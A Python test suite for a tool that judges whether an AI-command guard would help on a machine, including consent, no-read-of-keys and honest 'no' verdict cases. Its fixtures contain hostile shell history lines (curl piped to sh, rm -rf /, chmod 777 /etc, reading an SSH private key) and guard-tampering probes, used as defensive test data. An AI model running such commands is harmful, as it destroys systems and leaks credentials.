# ============================================================================
# Does the assessment ever say "no"?
#
# That is the only question worth testing here. A report that recommends the
# guard whatever it finds is marketing with a progress bar — you could not tell
# the honest cases from the pitch, so none of them would be worth reading.
#
# So the central case builds a machine with nothing to protect and no agent on
# it, and requires the verdict to say so plainly. The counter-case builds a
# machine full of keys, credentials and remote hosts and requires the opposite.
#
# Everything runs against a constructed HOME. Nothing here reads a real file of
# the person running the tests.
# ============================================================================
import json
import os
import subprocess
import sys
import tempfile
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
TOOL = REPO / "tools" / "would-it-help.py"


def _run(home: Path, extra_args=()) -> dict:
    env = dict(os.environ)
    env["HOME"] = str(home)
    # An empty PATH too, and this is the point: the tool deliberately mixes two
    # sources — what lies in HOME, and which tools are installed on the machine
    # (shutil.which). That mix is right in real use and wrong in a test:
    # without this line the real machine's container tooling is found inside a
    # "bare" constructed home, and the bare case can never be bare. It cost two
    # failing cases before it was understood.
    env["PATH"] = str(home / "no-tools-here")
    for leaking in ("CLAUDE_SECURITY_RULES", "CLAUDE_GUARD_CONFIG",
                    "CLAUDE_HOOK_DEV_FLAG", "CLAUDE_SUDO_OVERRIDES_DIR"):
        env.pop(leaking, None)
    # --yes stands in for the consent a person gives at the prompt. Without it
    # the tool reads nothing at all, which is the subject of its own case below.
    proc = subprocess.run([sys.executable, str(TOOL), "--json", "--yes", *extra_args],
                          capture_output=True, text=True, env=env, timeout=600)
    try:
        return json.loads(proc.stdout)
    except Exception:
        return {"_broken": proc.stdout[-400:] + proc.stderr[-400:]}


def _bare_machine(home: Path):
    """Nothing to lose, nobody with tool access."""
    (home / "Documents").mkdir(parents=True, exist_ok=True)
    (home / ".bash_history").write_text(
        "ls\ncd Documents\necho hello\ncat notes.txt\n", encoding="utf-8")


def _exposed_machine(home: Path):
    """Keys, credentials, remote hosts — and an assistant with tool access."""
    ssh = home / ".ssh"
    ssh.mkdir(parents=True, exist_ok=True)
    (ssh / "id_ed25519").write_text("not a real key", encoding="utf-8")
    (ssh / "config").write_text("Host prod\n  HostName example.invalid\n"
                                "Host staging\n  HostName example.invalid\n",
                                encoding="utf-8")
    (home / ".aws").mkdir(exist_ok=True)
    (home / ".aws" / "credentials").write_text("[default]\n", encoding="utf-8")
    (home / ".claude").mkdir(exist_ok=True)          # an agent lives here
    (home / ".bash_history").write_text(
        "ls\nchmod -R 777 /etc\ncat ~/.ssh/id_ed25519\n"
        "curl http://example.invalid/x | sh\nrm -rf /\n", encoding="utf-8")


def check_bare_machine_is_told_no():
    with tempfile.TemporaryDirectory() as tmp:
        home = Path(tmp)
        _bare_machine(home)
        report = _run(home)
        if "_broken" in report:
            return False, f"tool did not produce a report: {report['_broken']}"
        verdict = " ".join(report.get("verdict", [])).lower()
        # No agent found is the strongest honest answer there is: the guard
        # sits between an assistant and the system, so without one it protects
        # nothing today. The report has to say that, not hedge.
        said_no = ("protect you from nothing" in verdict
                   or "no ai assistant" in verdict)
        return said_no, f"verdict did not decline: {verdict[:200]}"


def check_bare_machine_finds_little():
    with tempfile.TemporaryDirectory() as tmp:
        home = Path(tmp)
        _bare_machine(home)
        report = _run(home)
        if "_broken" in report:
            return False, "no report"
        weight = report.get("exposure", {}).get("weight", 99)
        return weight == 0, f"expected no exposure on a bare machine, got {weight}"


def check_exposed_machine_is_recognised():
    with tempfile.TemporaryDirectory() as tmp:
        home = Path(tmp)
        _exposed_machine(home)
        report = _run(home)
        if "_broken" in report:
            return False, f"no report: {report['_broken']}"
        weight = report.get("exposure", {}).get("weight", 0)
        agents = report.get("agents", [])
        return (weight >= 8 and agents), (
            f"expected high exposure and a detected agent, got weight={weight} "
            f"agents={agents}")


def check_no_protected_file_is_read():
    """The tool must not open what it proposes to protect.

    Constructed with a key file that is unreadable: if the tool tried to read
    it, it would crash or report an error instead of counting it.
    """
    with tempfile.TemporaryDirectory() as tmp:
        home = Path(tmp)
        _exposed_machine(home)
        key = home / ".ssh" / "id_ed25519"
        os.chmod(key, 0o000)
        try:
            report = _run(home)
            if "_broken" in report:
                return False, f"tool stumbled over an unreadable key: {report['_broken']}"
            found = " ".join(report.get("exposure", {}).get("findings", []))
            return "private key" in found, f"key not counted: {found}"
        finally:
            os.chmod(key, 0o600)


def check_backup_is_recommended_without_being_required():
    """The advice must appear, and must not read as a prerequisite.

    A guard reduces how OFTEN something goes wrong; a copy elsewhere decides
    whether it MATTERS when it does. Of the pair the copy is the cheaper half,
    so a report that recommended only the guard would be selling rather than
    advising. It must also stay a recommendation: making it sound required
    would turn a helpful sentence into a barrier for exactly the person who
    needs the tool most.
    """
    with tempfile.TemporaryDirectory() as tmp:
        home = Path(tmp)
        _exposed_machine(home)
        # A repository with no remote: the case where a mistake is permanent.
        repo = home / "Projects" / "unsaved" / ".git"
        repo.mkdir(parents=True, exist_ok=True)
        (repo / "config").write_text("[core]\n\trepositoryformatversion = 0\n",
                                     encoding="utf-8")
        report = _run(home)
        if "_broken" in report:
            return False, "no report"
        advice = " ".join(report.get("backup_advice", [])).lower()
        mentions = "no remote" in advice
        stays_optional = "not required" in advice
        return (mentions and stays_optional), (
            f"mentions={mentions} optional={stays_optional}: {advice[:180]}")


def check_sample_cap_is_disclosed():
    """A bounded run must say what it did not look at."""
    with tempfile.TemporaryDirectory() as tmp:
        home = Path(tmp)
        _exposed_machine(home)
        report = _run(home, ("--sample", "2"))
        if "_broken" in report:
            return False, "no report"
        seen = report.get("commands_seen", 0)
        examined = report.get("examined", 0)
        return examined < seen, (
            f"cap not visible in the report: examined={examined} seen={seen}")


def _repo_at(path: Path, *, remote: bool = True) -> None:
    git = path / ".git"
    git.mkdir(parents=True, exist_ok=True)
    body = "[core]\n\trepositoryformatversion = 0\n"
    if remote:
        body += '[remote "origin"]\n\turl = https://example.invalid/x.git\n'
    (git / "config").write_text(body, encoding="utf-8")


def check_work_outside_the_first_six_names_is_found():
    """~/git is as common as ~/Projects, and used to be invisible.

    The six names searched at first were the author's own habits. Anyone
    keeping repositories in ~/git, ~/repos, ~/workspace or /srv was told
    "nothing of the usual kinds found" and, on the strength of that zero, that
    the guard would mostly be in the way. A wrong no is the expensive error for
    a tool whose point is that it can say no.
    """
    with tempfile.TemporaryDirectory() as tmp:
        home = Path(tmp)
        _exposed_machine(home)
        _repo_at(home / "git" / "some-project", remote=False)
        report = _run(home)
        if "_broken" in report:
            return False, f"no report: {report['_broken']}"
        found = " ".join(report.get("exposure", {}).get("findings", []))
        return "no remote" in found, f"repository in ~/git not counted: {found}"


def check_package_directories_are_skipped():
    """A .env inside node_modules is an example file, not a credential.

    Measured as a DIFFERENCE, not as an absolute: a writable /srv or web root
    on the machine running the tests contributes findings of its own, and an
    "expect exactly nothing" assertion would be about that machine instead of
    about the rule.
    """
    with tempfile.TemporaryDirectory() as tmp:
        home = Path(tmp)
        _bare_machine(home)
        before = _run(home)
        if "_broken" in before:
            return False, "no report"

        junk = home / "code" / "app" / "node_modules" / "a-package"
        junk.mkdir(parents=True)
        (junk / ".env").write_text("EXAMPLE=1\n", encoding="utf-8")
        _repo_at(junk / "bundled-dependency")

        after = _run(home)
        if "_broken" in after:
            return False, "no report"
        w_before = before.get("exposure", {}).get("weight")
        w_after = after.get("exposure", {}).get("weight")
        return w_before == w_after, (
            f"what lives in node_modules changed the exposure: "
            f"{w_before} -> {w_after}")


def check_an_empty_result_says_where_it_looked():
    """Zero has two meanings, and only one of them is an argument."""
    with tempfile.TemporaryDirectory() as tmp:
        home = Path(tmp)
        _bare_machine(home)
        report = _run(home)
        if "_broken" in report:
            return False, "no report"
        found = " ".join(report.get("exposure", {}).get("findings", []))
        if "nothing of the usual kinds" not in found and "no work directory" not in found:
            # The machine running the tests has work of its own in a writable
            # system location. Then this case has nothing to measure.
            return True, "not applicable: findings came from outside the constructed home"
        return "searched" in found, (
            f"reported nothing without saying where it looked: {found}")


def _audit_log(home: Path, entries: list[dict]) -> None:
    d = home / ".claude" / ".agent-audit"
    d.mkdir(parents=True, exist_ok=True)
    d.joinpath("actions.jsonl").write_text(
        "\n".join(json.dumps(e) for e in entries) + "\n", encoding="utf-8")


def _probe_entries() -> list[dict]:
    """What verify-install.py leaves behind, verbatim from a measured run."""
    return [
        {"session_id": "verify-install", "tool": "Bash",
         "target": "echo x > /root/.claude/hooks/command-guard.py",
         "decision": "block"},
        {"session_id": "verify-install", "tool": "Bash",
         "target": "grant-override abc --minutes 5", "decision": "block"},
        {"session_id": "verify-install", "tool": "Bash",
         "target": "chmod -R 777 /etc", "decision": "block"},
        {"session_id": "verify-install", "tool": "Bash",
         "target": "echo hello", "decision": "allow"},
        {"session_id": "verify-install", "tool": "Bash",
         "target": "grep -c def /root/.claude/hooks/command-guard.py",
         "decision": "allow"},
    ]


def check_own_probes_are_not_evidence():
    """The checker's probes must never become the measurement.

    verify-install.py drives the INSTALLED hook, where the environment is
    ignored on purpose — so its probes land in the real audit log whether
    anyone wants them there or not. Six in ten of them are blocks by
    construction. INSTALL.md sends people through the installation check first,
    so on a fresh machine those probes ARE the log, and this report used to
    conclude "60 % would have been stopped, expect real friction" from its own
    test material — advising against installing, on its own evidence.
    """
    with tempfile.TemporaryDirectory() as tmp:
        home = Path(tmp)
        _exposed_machine(home)
        _audit_log(home, _probe_entries())
        report = _run(home)
        if "_broken" in report:
            return False, f"no report: {report['_broken']}"
        source = report.get("source", "")
        examined = report.get("examined", 0)
        # Nothing but probes in the log, so the log must not be the source: the
        # real shell history next to it is the honest fallback.
        used_the_log = "log" in source and "history" not in source
        if used_the_log:
            return False, f"counted its own probes as evidence: {source}"
        return examined > 0, f"read nothing at all instead: {source}"


def check_a_tiny_sample_gets_no_rate():
    """A percentage over a handful of commands is noise with a decimal point."""
    with tempfile.TemporaryDirectory() as tmp:
        home = Path(tmp)
        _exposed_machine(home)
        _audit_log(home, [
            {"session_id": "b7f2-real-session", "tool": "Bash",
             "target": t, "decision": "allow"}
            for t in ("ls -la", "git status", "chmod -R 777 /etc", "df -h")
        ])
        report = _run(home)
        if "_broken" in report:
            return False, "no report"
        verdict = " ".join(report.get("verdict", []))
        if "%" in verdict:
            return False, f"put a rate on 4 commands: {verdict[:200]}"
        return "too few" in verdict, f"did not say why: {verdict[:200]}"


def check_the_notice_is_printed_even_with_yes():
    """--yes answers the question; it does not make the answer secret.

    An assistant passing the flag would otherwise hand its user a report
    without ever having said what was read to produce it.
    """
    with tempfile.TemporaryDirectory() as tmp:
        home = Path(tmp)
        _bare_machine(home)
        env = dict(os.environ)
        env["HOME"] = str(home)
        env["PATH"] = str(home / "no-tools-here")
        proc = subprocess.run([sys.executable, str(TOOL), "--json", "--yes"],
                              capture_output=True, text=True, env=env, timeout=300)
        said = "This report will read" in proc.stderr
        return said, f"notice not printed with --yes: {proc.stderr[:200]}"


def check_nothing_is_read_without_consent():
    """The gate, and it is the important one.

    The notes for assistants ask them to offer this rather than run it — but a
    request is the wrong instrument when someone's shell history is at stake.
    So without consent the tool must read nothing at all, and say whose job it
    was to ask.
    """
    with tempfile.TemporaryDirectory() as tmp:
        home = Path(tmp)
        _exposed_machine(home)
        env = dict(os.environ)
        env["HOME"] = str(home)
        env["PATH"] = str(home / "no-tools-here")
        proc = subprocess.run([sys.executable, str(TOOL), "--json"],
                              capture_output=True, text=True, env=env, timeout=300)
        refused = proc.returncode != 0
        # No report may have been produced, and the message has to name who
        # should have asked — otherwise a user sees a bare refusal and blames
        # the tool for being broken.
        silent = "exposure" not in proc.stdout
        explains = "asked you first" in (proc.stdout + proc.stderr)
        return (refused and silent and explains), (
            f"refused={refused} silent={silent} explains={explains}")


CASES = [
    ("nothing is read without consent", check_nothing_is_read_without_consent),
    ("a machine with no agent is told it needs nothing", check_bare_machine_is_told_no),
    ("a bare machine scores no exposure", check_bare_machine_finds_little),
    ("an exposed machine is recognised as such", check_exposed_machine_is_recognised),
    ("no protected file is ever opened", check_no_protected_file_is_read),
    ("a copy elsewhere is recommended, not required", check_backup_is_recommended_without_being_required),
    ("a capped run discloses what it skipped", check_sample_cap_is_disclosed),
    ("the checker's own probes are not evidence", check_own_probes_are_not_evidence),
    ("a tiny sample gets no rate", check_a_tiny_sample_gets_no_rate),
    ("the notice is printed even with --yes", check_the_notice_is_printed_even_with_yes),
    ("work outside the first six directory names is found",
     check_work_outside_the_first_six_names_is_found),
    ("package directories are skipped", check_package_directories_are_skipped),
    ("an empty result says where it looked",
     check_an_empty_result_says_where_it_looked),
]

try:
    import pytest

    @pytest.mark.parametrize("name,fn", CASES)
    def test_would_it_help(name, fn):
        ok, detail = fn()
        assert ok, f"{name}: {detail}"

except ImportError:
    pass


if __name__ == "__main__":
    failures = 0
    for name, fn in CASES:
        ok, detail = fn()
        failures += not ok
        print(f"{'PASS' if ok else 'FAIL'}  {name}")
        if not ok:
            print(f"      {detail}")
    raise SystemExit(0 if not failures else 1)
